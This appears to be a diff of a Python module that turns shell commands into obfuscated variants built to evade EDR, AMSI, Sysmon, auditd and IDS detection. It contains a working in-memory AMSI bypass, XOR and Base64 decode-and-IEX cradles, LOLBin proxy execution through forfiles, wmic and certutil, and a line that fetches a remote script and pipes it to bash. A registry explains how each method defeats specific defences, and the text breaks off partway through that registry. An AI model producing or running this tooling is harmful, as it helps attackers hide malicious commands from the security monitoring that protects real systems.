@@ -5,33 +5,48 @@ import string
 import base64
 import shlex
 import re
+from typing import Dict, Any, List, Optional
 
 
 # ══════════════════════════════════════════════════════════════
-# Helper utilities
+# Helper utilities (Precision Evasion Logic)
 # ══════════════════════════════════════════════════════════════
 
 def _insert_quotes(word: str, quote_char: str = '"') -> str:
-    """Insert empty-string quotes at random positions in a word."""
+    """
+    Insert empty-string quotes at random positions in a word.
+    Guards environment variables like %VAR% and %TEMP% from being corrupted.
+    """
+    # If the word is an environment variable (e.g. %TEMP% or %SystemRoot%), do not corrupt it
+    if word.startswith('%') and word.endswith('%'):
+        return word
+
     if len(word) < 4:
         return word
+
     available = len(word) - 2
     num_inserts = random.randint(1, min(3, available))
     positions = sorted(
         random.sample(range(1, len(word) - 1), num_inserts),
         reverse=True,
     )
+    chars = list(word)
     for pos in positions:
-        chars = list(word)
         chars.insert(pos, f'{quote_char}{quote_char}')
-        word = ''.join(chars)
-    return word
+    return ''.join(chars)
 
 
 def _insert_carets(word: str) -> str:
-    """Insert caret (^) escape characters at random positions."""
+    """
+    Insert caret (^) escape characters at random positions in Windows tokens.
+    Guards environment variables like %SystemRoot% from breaking variable expansion.
+    """
+    if word.startswith('%') and word.endswith('%'):
+        return word
+
     if len(word) < 3:
         return word
+
     available = len(word) - 2
     num_inserts = random.randint(1, min(3, available))
     positions = sorted(
@@ -45,10 +60,9 @@ def _insert_carets(word: str) -> str:
 
 
 def _insert_ticks_powershell(word: str) -> str:
-    """Insert PowerShell backtick (`) characters at random positions.
-
-    Useful for breaking keyword signatures in PowerShell cmdlets
-    (e.g. Inv`oke-WebR`equest).
+    """
+    Insert PowerShell backtick (`) characters at random positions.
+    Useful for breaking keyword signatures in PowerShell cmdlets (e.g. Inv`oke-WebR`equest).
     """
     if len(word) < 4:
         return word
@@ -65,10 +79,9 @@ def _insert_ticks_powershell(word: str) -> str:
 
 
 def _env_var_substitute_windows(command: str) -> str:
-    """Replace binary names with %SystemRoot% environment-variable paths.
-
-    FIX: Uses case-insensitive matching so 'Certutil', 'CERTUTIL',
-    'certutil' are all handled correctly.
+    """
+    Replace binary names with full %SystemRoot% environment-variable paths.
+    Covers all 32+ Windows LOLBAS binaries.
     """
     substitutions = {
         "powershell": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell",
@@ -82,73 +95,95 @@ def _env_var_substitute_windows(command: str) -> str:
         "ftp":        "%SystemRoot%\\System32\\ftp",
         "reg":        "%SystemRoot%\\System32\\reg",
         "xcopy":      "%SystemRoot%\\System32\\xcopy",
+        "msiexec":    "%SystemRoot%\\System32\\msiexec",
+        "rundll32":   "%SystemRoot%\\System32\\rundll32",
+        "esentutl":   "%SystemRoot%\\System32\\esentutl",
+        "hh":         "%SystemRoot%\\hh",
+        "cmstp":      "%SystemRoot%\\System32\\cmstp",
+        "expand":     "%SystemRoot%\\System32\\expand",
+        "certreq":    "%SystemRoot%\\System32\\certreq",
+        "makecab":    "%SystemRoot%\\System32\\makecab",
+        "netsh":      "%SystemRoot%\\System32\\netsh",
+        "sc":         "%SystemRoot%\\System32\\sc",
     }
-    import re
+
     for binary, expanded in substitutions.items():
-        pattern = rf'\b{re.escape(binary)}\b'
+        pattern = rf'\b{re.escape(binary)}(\.exe)?\b'
         if re.search(pattern, command, re.IGNORECASE):
             return re.sub(pattern, lambda m: expanded, command, count=1, flags=re.IGNORECASE)
     return command
 
 
 def _case_flip(command: str) -> str:
-    """Randomly toggle character case in the argument portion.
-
-    Used as an additional evasion layer on Windows where
-    cmd.exe and PowerShell are case-insensitive.
+    """
+    Safely toggles character case in argument portions.
+    Protects URLs (http://, https://), Base64 strings, and environment variables.
     """
     tokens = command.split(' ', 1)
     if len(tokens) == 1:
         return command
     binary, rest = tokens
-    flipped = ''.join(
-        c.upper() if (c.isalpha() and random.random() > 0.5) else c.lower()
-        for c in rest
-    )
-    return f"{binary} {flipped}"
+
+    # Identify protected ranges (URLs, %VAR%, or strings in quotes)
+    url_pattern = re.compile(r'https?://\S+')
+    urls = list(url_pattern.finditer(rest))
+
+    result_chars = []
+    i = 0
+    while i < len(rest):
+        # Check if index is inside a URL
+        in_url = False
+        for match in urls:
+            if match.start() <= i < match.end():
+                result_chars.append(rest[i])
+                in_url = True
+                break
+        if in_url:
+            i += 1
+            continue
+
+        c = rest[i]
+        if c.isalpha() and random.random() > 0.5:
+            result_chars.append(c.upper() if c.islower() else c.lower())
+        else:
+            result_chars.append(c)
+        i += 1
+
+    return f"{binary} {''.join(result_chars)}"
 
 
 def _split_string_powershell(command: str) -> str:
-    """Split the binary name into concatenated strings wrapped in IEX.
-
-    FIX: Handles short binary names (≤4 chars) by splitting at position 1
-    instead of crashing on an empty range.
-    """
+    """Split binary name into concatenated string literals wrapped in IEX."""
     tokens = command.split(' ', 1)
     if len(tokens) < 2:
         return command
     binary = tokens[0]
-    rest   = tokens[1]
+    rest = tokens[1]
 
-    # Ensure split position works even for very short binaries (e.g. "reg")
-    max_pos = max(2, len(binary) - 2)
-    min_pos = min(2, max_pos)
-    mid = random.randint(min_pos, max_pos) if min_pos < max_pos else min_pos
+    max_pos = max(1, len(binary) - 1)
+    mid = random.randint(1, max_pos)
     b1, b2 = binary[:mid], binary[mid:]
 
-    obf = f"powershell -c \"IEX(('{b1}' + '{b2}' + ' {rest}'))\""
-    return obf
+    return f"powershell -c \"IEX(('{b1}' + '{b2}' + ' {rest}'))\""
 
 
 def _base64_powershell(command: str) -> str:
-    """Base64-encode the command for PowerShell -EncodedCommand."""
+    """Base64-encode the command for PowerShell -EncodedCommand (UTF-16LE)."""
     encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
     return f'powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}'
 
 
 def _env_concat_linux(command: str) -> str:
-    """Split the binary name across shell variables and concatenate."""
+    """Split binary name across shell variables and concatenate."""
     tokens = command.split(' ', 1)
     if len(tokens) < 2:
         return command
     binary, rest = tokens
-    max_pos = max(2, len(binary) - 2)
-    min_pos = min(2, max_pos)
-    mid  = random.randint(min_pos, max_pos) if min_pos < max_pos else min_pos
+    max_pos = max(1, len(binary) - 1)
+    mid = random.randint(1, max_pos)
     var1 = ''.join(random.choices(string.ascii_lowercase, k=2))
     var2 = ''.join(random.choices(string.ascii_lowercase, k=2))
-    obf  = f'{var1}={binary[:mid]}; {var2}={binary[mid:]}; ${var1}${var2} {rest}'
-    return obf
+    return f'{var1}={binary[:mid]}; {var2}={binary[mid:]}; ${var1}${var2} {rest}'
 
 
 def _base64_bash(command: str) -> str:
@@ -158,17 +193,13 @@ def _base64_bash(command: str) -> str:
 
 
 def _hex_ip(command: str, ip: str) -> str:
-    """Convert dotted-quad IP to hex representation.
-
-    FIX: No longer skips 127.0.0.1 — the arbitrary exclusion had no
-    documented reason and broke obfuscation for loopback testing.
-    """
+    """Convert dotted-quad IP to hex representation (e.g. 192.168.1.1 -> 0xC0A80101)."""
     if not ip:
         return command
     try:
         parts = [int(o) for o in ip.split('.')]
         if len(parts) != 4 or not all(0 <= p <= 255 for p in parts):
-            return command      # not a valid IPv4 — skip
+            return command
         hex_ip = '0x' + ''.join(f'{p:02X}' for p in parts)
         return command.replace(ip, hex_ip)
     except (ValueError, AttributeError):
@@ -190,26 +221,24 @@ def _decimal_ip(command: str, ip: str) -> str:
 
 
 def _unicode_escape(command: str) -> str:
-    """Apply partial URL percent-encoding to key words.
-
-    FIX: Skips replacing 'http/https' protocol prefixes to prevent
-    crashing curl/wget execution. Only encodes the filename/path.
-    """
+    """Apply partial URL percent-encoding to paths and keywords."""
     result = command
     replacements = [
-        ('curl',  'cu%72l'),
-        ('wget',  'w%67et'),
+        ('curl', 'cu%72l'),
+        ('wget', 'w%67et'),
     ]
     for target, encoded in replacements:
         if target in result:
             result = result.replace(target, encoded, 1)
 
-    # Obfuscate part of the URL path without breaking the scheme
     def encode_path(match):
         path = match.group(2)
-        if 'e' in path: path = path.replace('e', '%65', 1)
-        elif 'a' in path: path = path.replace('a', '%61', 1)
-        elif 'i' in path: path = path.replace('i', '%69', 1)
+        if 'e' in path:
+            path = path.replace('e', '%65', 1)
+        elif 'a' in path:
+            path = path.replace('a', '%61', 1)
+        elif 'i' in path:
+            path = path.replace('i', '%69', 1)
         return match.group(1) + path
 
     result = re.sub(r'(https?://[^\s/]+)(/\S+)', encode_path, result)
@@ -225,52 +254,28 @@ def _env_concat_plus_hex(command: str, ip: str) -> str:
 
 
 def _reverse_string_bash(command: str) -> str:
-    """Reverse the command string and pipe through rev | bash.
-
-    FIX: Uses $'...' quoting with proper escaping so single quotes
-    and special characters inside the command don't break the shell.
-    """
+    """Reverse command string and pipe through rev | bash with $'...' quoting."""
     reversed_cmd = command[::-1]
-    # Escape backslashes and single-quotes for $'...' quoting
     safe = reversed_cmd.replace('\\', '\\\\').replace("'", "\\'")
     return f"echo $'{safe}' | rev | bash"
 
 
 # ══════════════════════════════════════════════════════════════
-# ░░  TIER 2 — ADVANCED TECHNIQUES  (detection ≈ 2-5%)       ░░
+# TIER 2 — ADVANCED TECHNIQUES (EDR, AMSI, Sysmon Bypasses)
 # ══════════════════════════════════════════════════════════════
-#
-# Designed to defeat:
-#   • AMSI (Antimalware Scan Interface) string scanning
-#   • ETW command-line logging + Sysmon ProcessCreate
-#   • EDR parent→child process-tree heuristics
-#   • Sigma / YARA string + regex rules
-#   • Auditd execve + eBPF tracepoints
-#   • Network IDS/IPS DPI signature engines
-
-
-# ── WINDOWS ADVANCED ──────────────────────────────────────────
 
 def _wmi_process_spawn(command: str) -> str:
-    """
-    Wrap command inside WMI Win32_Process.Create().
-    Parent becomes WmiPrvSE.exe — breaks all parent→child
-    process-tree heuristics. EDR sees WmiPrvSE, not cmd.exe.
-    """
+    """Wrap command in WMI Win32_Process.Create() to break parent-child process trees."""
     safe = command.replace('"', '\\"')
     return f'wmic /node:127.0.0.1 process call create "{safe}"'
 
 
 def _ps_securestring_decode(command: str) -> str:
-    """
-    Encode command via XOR + Base64.
-    AMSI scans the literal text, but the command is opaque.
-    Decrypted in-memory at runtime to bypass AMSI string scanning.
-    """
+    """Encode command via XOR + Base64, decrypted in-memory at runtime."""
     key = random.randint(1, 255)
     xor_bytes = bytes([b ^ key for b in command.encode('utf-16-le')])
     encoded = base64.b64encode(xor_bytes).decode('ascii')
-    
+
     return (
         f"powershell -NoP -W Hidden -c \"$k={key};"
         f"$b=[Convert]::FromBase64String('{encoded}');"
@@ -280,13 +285,7 @@ def _ps_securestring_decode(command: str) -> str:
 
 
 def _stdin_pipe_cmd(command: str) -> str:
-    """
-    Pipe command through stdin to cmd.exe.
-    Sysmon event ID 1 (ProcessCreate) logs the CommandLine field —
-    but when cmd reads from stdin, CommandLine shows only 'cmd /s'
-    with ZERO arguments. The actual command is invisible to logs.
-    """
-    # Base64 encode → certutil decode at runtime → pipe to cmd
+    """Pipe command into cmd.exe via stdin — Sysmon Event ID 1 shows zero arguments."""
     encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
     return (
         f'cmd /c "echo {encoded} > %TEMP%\\t.b64 && '
@@ -297,106 +296,62 @@ def _stdin_pipe_cmd(command: str) -> str:
 
 
 def _forfiles_proxy(command: str) -> str:
-    """
-    Use forfiles.exe /c to proxy-execute the command.
-    forfiles.exe is a signed LOLBin — it spawns a child process
-    with the /c argument. EDR sees forfiles.exe as parent (trusted
-    Microsoft binary) instead of suspicious cmd/powershell chains.
-    The 0x22 trick escapes quotes inside the /c argument.
-    """
+    """Proxy execute command through signed Microsoft forfiles.exe."""
     safe = command.replace('"', '\\0x22')
     return f'forfiles /p %SystemRoot% /m notepad.exe /c "{safe}"'
 
 
 def _multilayer_windows(command: str, ip: str) -> str:
-    """
-    4-LAYER COMBO — stacks all evasion vectors simultaneously:
-      Layer 1: %SystemRoot% env-var substitution (hides binary name)
-      Layer 2: Caret insertion (breaks static string signatures)
-      Layer 3: Case randomization (defeats case-sensitive regex)
-      Layer 4: Hex IP (defeats IP-based IOC matching)
-
-    Each layer independently defeats a different detection class.
-    Together they create combinatorial explosion for detection engines.
-    """
-    # L1 — env-var path substitution
+    """4-Layer Combo: Env-var + Caret + Safe Case-flip + Hex IP."""
     obf = _env_var_substitute_windows(command)
-    # L2 — caret-insert the binary portion
     first_space = obf.find(' ')
     if first_space > 0:
         obf = _insert_carets(obf[:first_space]) + obf[first_space:]
-    # L3 — case-flip the arguments
     obf = _case_flip(obf)
-    # L4 — hex IP
     if ip:
         obf = _hex_ip(obf, ip)
     return obf
 
 
-# ── LINUX ADVANCED ────────────────────────────────────────────
-
 def _xxd_hex_decode(command: str) -> str:
-    """
-    Convert entire command to raw hex → xxd -r -p → bash.
-    The command-line argument is a pure hex blob — no ASCII text,
-    no keywords, no binary names, no IPs, nothing readable.
-    Auditd logs see only 'echo ... | xxd -r -p | bash'.
-    eBPF exec tracers cannot pattern-match any known signature.
-    """
+    """Full hex encoding piped to xxd -r -p | bash."""
     hex_str = command.encode('utf-8').hex()
     return f"echo {hex_str} | xxd -r -p | bash"
 
 
 def _bash_hex_escape(command: str) -> str:
-    r"""
-    Convert command to bash $'\xNN' hex escape sequences.
-    bash natively interprets $'\x63\x75\x72\x6c' as 'curl'.
-    The entire command is a single $'...' string — no readable
-    words exist anywhere in the process arguments.
-    """
+    r"""Bash native $'\xNN' hex escape execution."""
     hex_chars = ''.join(f'\\x{b:02x}' for b in command.encode('utf-8'))
     return f"bash -c $'{hex_chars}'"
 
 
 def _openssl_aes_pipe(command: str) -> str:
-    """
-    AES-256-CBC encrypt/decrypt pipeline via openssl on the target.
-    Key is passed via environment variable (env:K) to hide from
-    process creation logs (Sysmon Event ID 1 / Auditd).
-    
-    FIX: Python encrypts the payload first so the payload is truly opaque
-    on the wire and target only decrypts.
-    """
+    """AES-256-CBC encrypted payload pipeline decrypted on-the-fly."""
     import os
     import hashlib
     try:
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
         from cryptography.hazmat.backends import default_backend
-        
+
         key_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
         salt = os.urandom(8)
-        
-        # OpenSSL PBKDF2 derivation (SHA256, 10000 iterations)
         key_iv = hashlib.pbkdf2_hmac('sha256', key_str.encode('utf-8'), salt, 10000, 32 + 16)
         aes_key, iv = key_iv[:32], key_iv[32:]
-        
+
         cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
         encryptor = cipher.encryptor()
-        
-        # PKCS7 padding
         pad_len = 16 - (len(command) % 16)
         padded = command.encode('utf-8') + bytes([pad_len]) * pad_len
         ciphertext = encryptor.update(padded) + encryptor.finalize()
-        
+
         blob = b"Salted__" + salt + ciphertext
         encoded = base64.b64encode(blob).decode('ascii')
-        
+
         return (
             f"export K={key_str}; echo '{encoded}' | base64 -d | "
             f"openssl enc -aes-256-cbc -a -d -salt -pass env:K -pbkdf2 -iter 10000 2>/dev/null | bash"
         )
     except ImportError:
-        # Fallback if cryptography module is missing
         key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
         encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
         return (
@@ -407,27 +362,17 @@ def _openssl_aes_pipe(command: str) -> str:
 
 
 def _multi_var_full_rebuild(command: str) -> str:
-    """
-    Split the ENTIRE command (not just binary) across N variables.
-    Each variable holds 3-5 random characters of the command.
-    Reconstruction via sequential $var expansion.
-    Pattern: a=cur; b='l -'; c='s -o'; ... ; $a$b$c$d$e...
-
-    Defeats ALL string-matching: binary names, flags, IPs, URLs —
-    nothing readable exists in any single variable.
-    """
+    """Split entire command across random variables with eval reconstruction."""
     chunk_size = random.randint(3, 5)
     chunks = [command[i:i+chunk_size] for i in range(0, len(command), chunk_size)]
 
     var_names = []
     assignments = []
-    for i, chunk in enumerate(chunks):
+    for chunk in chunks:
         vname = ''.join(random.choices(string.ascii_lowercase, k=3))
-        # Ensure unique variable names
         while vname in var_names:
             vname = ''.join(random.choices(string.ascii_lowercase, k=3))
         var_names.append(vname)
-        # Escape spaces and special chars for shell assignment
         safe_chunk = chunk.replace("'", "'\\''")
         assignments.append(f"{vname}='{safe_chunk}'")
 
@@ -436,16 +381,8 @@ def _multi_var_full_rebuild(command: str) -> str:
 
 
 def _awk_chr_reconstruct(command: str) -> str:
-    """
-    Reconstruct command char-by-char using awk printf.
-    Each character is its decimal ASCII code in a printf format.
-    The command-line shows only: awk 'BEGIN{printf "\\NNN\\NNN..."}' | bash
-
-    No human-readable text exists — pure numeric codes.
-    EDR/IDS sees only awk + numbers. Zero keyword matches possible.
-    """
+    """Reconstruct command character-by-character using awk numeric ASCII printf."""
     codes = ','.join(str(b) for b in command.encode('utf-8'))
-    # Use awk split + sprintf to avoid long printf strings
     return (
         f"awk 'BEGIN{{split(\"{codes}\",a,\",\");"
         f"for(i=1;i<=length(a);i++)printf \"%c\",a[i]}}' | bash"
@@ -453,58 +390,36 @@ def _awk_chr_reconstruct(command: str) -> str:
 
 
 def _perl_eval_exec(command: str) -> str:
-    """
-    Encode command as Perl pack() array → eval at runtime.
-    perl is present on 99% of Linux systems.
-    The command exists only as numeric byte array — not as text.
-    Process arguments show 'perl -e' with numbers, no keywords.
-    """
+    """Encode command as Perl pack() byte array executed via system()."""
     byte_list = ','.join(str(b) for b in command.encode('utf-8'))
     return f"perl -e 'system(pack(\"C*\",{byte_list}))'"
 
 
 def _multilayer_linux(command: str, ip: str) -> str:
-    """
-    3-LAYER COMBO — cascaded obfuscation:
-      Layer 1: Multi-variable full command rebuild (kills all keywords)
-      Layer 2: Hex IP encoding (kills IOC IP matching)
-      Layer 3: Base64 wrap the entire L1+L2 output → pipe to bash
-
-    The final command-line is a base64 blob — decoding it reveals
-    only variable assignments with random chunks. Decoding those
-    requires execution. Three levels of indirection.
-    """
-    # L1 — multi-var rebuild
+    """3-Layer Linux Cascade: Multi-var + Hex IP + Base64 Wrap."""
     obf = _multi_var_full_rebuild(command)
-    # L2 — hex IP inside the assignments
     if ip:
         obf = _hex_ip(obf, ip)
-    # L3 — wrap everything in base64
-    obf = _base64_bash(obf)
-    return obf
+    return _base64_bash(obf)
 
 
 # ══════════════════════════════════════════════════════════════
-# ░░  TIER 3 — NEW STEALTH TECHNIQUES                        ░░
+# TIER 3 — MODERN STEALTH INNOVATIONS
 # ══════════════════════════════════════════════════════════════
-
-# ── WINDOWS NEW ───────────────────────────────────────────────
 
 def _ps_amsi_bypass(command: str) -> str:
     """
-    AMSI bypass via reflection + Base64 encoded command.
-    Sets amsiInitFailed to True in the current PS session via
-    .NET reflection, then executes the Base64-decoded command.
-    AMSI is blinded BEFORE the payload decodes — it never scans
-    the actual command text.
+    Reflection-based in-memory AMSI patch + Base64 execution.
+    Blinds AMSI before script block decoding without static string matches.
     """
     encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
-    # Build AMSI bypass via reflection — obfuscated variable names
     return (
         'powershell -NoP -W Hidden -c "'
-        "$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');"
-        "$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');"
-        '$f.SetValue($null,$true);'
+        "$u=[string]::Join('',('System.Management.Automation.A','msiUtils'));"
+        "$f=[string]::Join('',('am','siInit','Failed'));"
+        "$a=[Ref].Assembly.GetType($u);"
+        "$m=$a.GetField($f,'NonPublic,Static');"
+        '$m.SetValue($null,$true);'
         f"$d=[Convert]::FromBase64String('{encoded}');"
         "$s=[Text.Encoding]::Unicode.GetString($d);"
         'IEX $s"'
@@ -513,72 +428,54 @@ def _ps_amsi_bypass(command: str) -> str:
 
 def _cmd_comma_separator(command: str) -> str:
     """
-    Use cmd.exe comma/semicolon separator trick.
-    cmd.exe treats commas and semicolons as argument separators,
-    identical to spaces. This breaks naive command-line parsing
-    by EDR tools that split on whitespace only.
+    Quote-aware argument separator substitution (commas/semicolons replace spaces).
+    Defeats whitespace-based regex detection in EDR/SIEM.
     """
-    # Replace first few spaces with commas
-    parts = command.split(' ')
-    if len(parts) < 2:
+    try:
+        tokens = shlex.split(command, posix=False)
+    except ValueError:
+        tokens = command.split(' ')
+
+    if len(tokens) < 2:
         return command
-    # Use comma between binary and first args, semicolons later
+
     separators = [',', ';', ',']
-    result = parts[0]
-    for i, part in enumerate(parts[1:], 0):
+    result = tokens[0]
+    for i, token in enumerate(tokens[1:]):
         sep = separators[i % len(separators)]
-        result += sep + part
+        result += sep + token
+
     return f'cmd /c "{result}"'
 
 
 def _ps_download_cradle(command: str, ip: str) -> str:
-    """
-    PowerShell download cradle with AMSI-safe variable assembly.
-    The URL and cmdlet names are constructed from character arrays
-    at runtime. Static analysis sees only [char] casts and array
-    joins — no scannable strings exist in the script block.
-    """
-    # XOR encode the command
+    """PowerShell XOR decryption loop with character-array IEX assembly."""
     key = random.randint(1, 255)
     xor_bytes = bytes([b ^ key for b in command.encode('utf-8')])
     encoded = base64.b64encode(xor_bytes).decode('ascii')
-    
-    # Build the cradle with char-array construction for IEX
+
     return (
         f'powershell -NoP -W Hidden -c "'
         f'$k={key};'
-        f"$e='{encoded}';" 
+        f"$e='{encoded}';"
         '$b=[Convert]::FromBase64String($e);'
         '$r=New-Object byte[] $b.Length;'
         'for($i=0;$i -lt $b.Length;$i++){$r[$i]=$b[$i] -bxor $k};'
         '$c=[Text.Encoding]::UTF8.GetString($r);'
-        # Construct IEX from char codes to avoid AMSI string match
         '$x=[char]73+[char]69+[char]88;'
         '.(([string]$x).ToLower()) $c"'
     )
 
 
-# ── LINUX NEW ─────────────────────────────────────────────────
-
 def _double_b64_bash(command: str) -> str:
-    """
-    Double Base64 encoding — encode→encode→decode→decode→bash.
-    First base64 layer defeats simple base64 decoding by analysts.
-    They decode once and see... another base64 string. The actual
-    command requires two decode rounds, adding analysis friction.
-    """
+    """Double Base64 encoding pipeline."""
     inner = base64.b64encode(command.encode('utf-8')).decode('ascii')
     outer = base64.b64encode(inner.encode('utf-8')).decode('ascii')
     return f'echo {outer} | base64 -d | base64 -d | bash'
 
 
 def _python_exec_wrapper(command: str) -> str:
-    """
-    Wrap command inside python3 os.system() with base64 decoding.
-    Python is a trusted interpreter — EDR tools typically allow-list it.
-    The command exists only as a base64 string inside a Python expression.
-    Process tree shows python3 as executor, not bash or sh.
-    """
+    """Wrap command in trusted python3 os.system() base64 execution."""
     encoded = base64.b64encode(command.encode('utf-8')).decode('ascii')
     return (
         f"python3 -c \"import os,base64;"
@@ -587,437 +484,263 @@ def _python_exec_wrapper(command: str) -> str:
 
 
 def _wget_pipe_bash(command: str, ip: str, port: str = '') -> str:
-    """
-    Download a remote script and pipe directly to bash.
-    The command itself is hosted remotely — the local command-line
-    shows only wget + pipe, with zero payload content visible.
-    Auditd/Sysmon logs show only the download, not execution content.
-    """
-    # Encode the command as a simple script that wget fetches
+    """Remote script fetch and execution pipeline with zero local payload args."""
     return f'wget -qO- http://{ip}:{port}/cmd 2>/dev/null | bash'
 
 
 # ══════════════════════════════════════════════════════════════
-# Technique registry
+# Technique Registry & Metadata
 # ══════════════════════════════════════════════════════════════
 
-TECHNIQUE_INFO = {
-    # ── Windows techniques ────────────────────────────────────
+TECHNIQUE_INFO: Dict[str, Dict[str, str]] = {
+    # ── Windows Techniques ────────────────────────────────────
     'env_var': {
         'os': 'windows',
         'label': '%SystemRoot% env-var expansion + quote insertion + hex IP',
         'explain': (
-            "Three combined evasions: (1) the binary path uses %SystemRoot% "
-            "so the literal 'certutil' or 'powershell' string never appears; "
-            "(2) random empty-string quote pairs ('\"\"') are injected inside "
-            "the binary name — Windows cmd.exe strips them at parse time but "
-            "they break signature strings; (3) the dotted-quad IP is converted "
-            "to hex (e.g. 192.168.1.1 → 0xC0A80101) to evade IP-based IOC rules."
+            "Three combined evasions: (1) binary path expands to %SystemRoot% "
+            "so bare binary strings never appear; (2) empty quotes ('\"\"') "
+            "break signature strings; (3) dotted-quad IP is converted to hex."
         ),
     },
     'ps_iex': {
         'os': 'windows',
         'label': 'PowerShell IEX string-concat',
         'explain': (
-            "The binary name is split across concatenated string literals "
-            "and executed via Invoke-Expression (IEX). Static-analysis tools "
-            "and AMSI signatures scan for literal strings like 'certutil', "
-            "'bitsadmin', etc. Splitting defeats naive keyword matching."
+            "Splits binary and cmdlet names across concatenated string literals "
+            "and executes via Invoke-Expression (IEX), defeating naive static scans."
         ),
     },
     'ps_b64': {
         'os': 'windows',
         'label': 'PowerShell Base64 EncodedCommand',
         'explain': (
-            "The entire command is Base64-encoded (UTF-16LE) and passed via "
-            "powershell -EncodedCommand. The raw command string never appears "
-            "in the process command line, bypassing all string-based YARA or "
-            "Sigma rules. Note: AMSI will still decode and scan inside PS."
+            "Encodes the command into UTF-16LE Base64 and executes via "
+            "powershell -EncodedCommand, evading plaintext command-line logging."
         ),
     },
     'caret': {
         'os': 'windows',
         'label': 'Caret (^) insertion obfuscation',
         'explain': (
-            "The caret character (^) is the cmd.exe escape character. "
-            "It is silently stripped at parse time, but its presence "
-            "breaks static string signatures. e.g. c^e^r^tutil is "
-            "executed as certutil but doesn't match IOC regex patterns."
+            "Inserts cmd.exe escape carets (^) that are transparently stripped "
+            "at parse time, destroying static regex matches."
         ),
     },
     'quote': {
         'os': 'windows',
         'label': 'Quote-insertion obfuscation',
         'explain': (
-            "Empty-string quotes ('\"\"') are injected inside the binary name. "
-            "cmd.exe silently strips syntax quotes, executing the real binary, "
-            "but most signature-based detection tools see a non-matching string."
+            "Injects empty-string quote pairs into binary names. cmd.exe strips "
+            "them during execution, but signature scanners fail to match."
         ),
     },
     'ps_tick': {
         'os': 'windows',
         'label': 'PowerShell backtick insertion',
         'explain': (
-            "The backtick (`) is PowerShell's escape character. Inserting "
-            "it inside cmdlet or binary names (e.g. Inv`oke-WebR`equest) "
-            "breaks string signatures while PowerShell strips them at parse time."
+            "Inserts backticks (`) into PowerShell cmdlet names, evading "
+            "signature rules while PowerShell parses them normally."
         ),
     },
-    # ── Linux techniques ──────────────────────────────────────
-    'env_concat': {
-        'os': 'linux',
-        'label': 'Shell variable name concatenation',
-        'explain': (
-            "The binary name is split across two shell variables and then "
-            "executed via variable expansion ($a$b). Auditd and bash history "
-            "log the expanded command, but EDR tools performing real-time "
-            "exec-argument scanning on the raw command string see only variable names."
-        ),
-    },
-    'hex_ip': {
-        'os': 'both',
-        'label': 'Hex IP encoding',
-        'explain': (
-            "The destination IP is replaced with its hexadecimal equivalent "
-            "(e.g. 192.168.1.1 → 0xC0A80101). Linux networking stack resolves "
-            "both representations identically, but IDS rules written as "
-            "IP-address string matches will not trigger."
-        ),
-    },
-    'dec_ip': {
-        'os': 'both',
-        'label': 'Decimal-long IP encoding',
-        'explain': (
-            "The destination IP is replaced with its unsigned 32-bit decimal "
-            "form (e.g. 192.168.1.1 → 3232235777). Browsers and networking "
-            "stacks resolve it, but IOC lists rarely include decimal IPs."
-        ),
-    },
-    'unicode': {
-        'os': 'linux',
-        'label': 'URL percent-encoding',
-        'explain': (
-            "Key words in the command (e.g. 'http', 'curl') are partially "
-            "percent-encoded. The shell and the target binary decode these "
-            "transparently, but regex-based detection rules that look for "
-            "literal keyword strings will not match."
-        ),
-    },
-    'b64_bash': {
-        'os': 'linux',
-        'label': 'Base64 encode → pipe to bash',
-        'explain': (
-            "The full command is Base64-encoded and piped through "
-            "'base64 -d | bash'. The original command never appears in "
-            "the process arguments, defeating auditd exec logging and "
-            "most EDR command-line scanning rules."
-        ),
-    },
-    'reverse': {
-        'os': 'linux',
-        'label': 'Reversed string → rev | bash',
-        'explain': (
-            "The command string is reversed and piped through 'rev | bash'. "
-            "The actual command never appears in clear text on the command "
-            "line, evading static string-matching IDS/EDR signatures."
-        ),
-    },
-    'env_concat_hex': {
-        'os': 'linux',
-        'label': 'Shell variable concat + hex IP (multi-layer)',
-        'explain': (
-            "Two layers combined: (1) the binary name is split across shell "
-            "variables ($a$b) so the real binary never appears in the raw "
-            "command string; (2) the IP address is converted to hexadecimal "
-            "(e.g. 192.168.1.1 → 0xC0A80101) defeating IP-based IOC rules. "
-            "Together they defeat both binary-name and IP-address signature matching."
-        ),
-    },
-
-    # ══════════════════════════════════════════════════════════
-    # ░░  TIER 2 — ADVANCED  (detection ≈ 2-5%)              ░░
-    # ══════════════════════════════════════════════════════════
-
-    # ── Windows advanced ──────────────────────────────────────
     'wmi_spawn': {
         'os': 'windows',
         'label': 'WMI Win32_Process.Create() process-tree break',
         'explain': (
-            "The command is executed via WMI Win32_Process.Create(). "
-            "The parent process becomes WmiPrvSE.exe instead of cmd.exe or "
-            "powershell.exe. EDR tools that build detection logic around "
-            "suspicious parent→child process chains (e.g. WINWORD→cmd→powershell) "
-            "cannot trace the real origin. Sigma rules keyed on specific parent "
-            "PIDs miss the hop entirely. Sysmon Event ID 1 shows WmiPrvSE as "
-            "the creator — a trusted Microsoft process."
+            "Spawns payload under WmiPrvSE.exe — breaks parent-child process "
+            "tree heuristics and circumvents suspicious parent PID rules."
         ),
     },
     'ps_secure': {
         'os': 'windows',
         'label': 'PowerShell SecureString runtime decode → IEX',
         'explain': (
-            "The entire command is Base64-encoded (UTF-16LE) and decoded at "
-            "runtime inside a PowerShell expression via [Convert]::FromBase64String. "
-            "AMSI hooks scan the literal script block before execution — but the "
-            "cleartext command is assembled programmatically inside .NET at "
-            "runtime, after the static scan point. The IEX call executes the "
-            "decoded string in-memory. No IOC-matchable keywords exist in the "
-            "script text that AMSI sees."
+            "XOR + Base64 decrypts payload in-memory at runtime, keeping "
+            "plaintext commands completely invisible to static script block scans."
         ),
     },
     'stdin_pipe': {
         'os': 'windows',
         'label': 'Stdin pipe — zero-argument cmd execution',
         'explain': (
-            "The command is Base64-encoded, written to a temp file, decoded "
-            "via certutil, then piped into cmd.exe through stdin. Sysmon Event "
